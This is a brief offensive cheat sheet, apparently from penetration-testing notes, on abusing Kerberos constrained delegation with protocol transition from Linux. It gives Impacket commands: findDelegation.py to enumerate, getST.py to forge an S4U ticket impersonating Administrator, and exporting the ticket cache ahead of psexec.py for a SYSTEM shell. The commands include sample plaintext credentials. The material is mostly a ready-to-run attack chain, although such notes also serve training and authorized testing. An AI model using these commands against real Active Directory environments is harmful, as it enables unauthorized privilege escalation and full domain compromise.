# 09.03 Constrained Delegation Linux

> Pop SYSTEM via `getST.py` S4U chain + `psexec.py -k -no-pass` — Impacket rewrites the SPN in-flight to swap services.

## Overview

findDelegation.py enumerates all three delegation types from Linux, identifying accounts with Constrained w/ Protocol Transition. getST.py performs the full S4U2Self + S4U2Proxy chain to forge a TGS as any user for the allowed SPN. psexec.py with -k -no-pass then uses the ccache ticket; it automatically rewrites the SPN in-flight to obtain an interactive SYSTEM shell.

## Steps

- Use findDelegation.py to list delegation types for all accounts.
- Identify a Constrained w/ Protocol Transition account and its allowed SPN.
- Run getST.py -spn SPN 'domain/user:pass' -impersonate Administrator to craft and save the ticket.
- Export the ccache path into KRB5CCNAME.
- Run psexec.py -k -no-pass for a SYSTEM shell; observe -debug output showing SPN rewriting.

## Commands

### findDelegation enumerate delegation

```bash
findDelegation.py <DOMAIN>.LOCAL/carole.rose:jasmine
```

### getST craft S4U ticket

```bash
getST.py -spn TERMSRV/DC01 '<DOMAIN>.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
```

### export KRB5CCNAME and psexec

```bash
export KRB5CCNAME=./Administrator.ccache
```
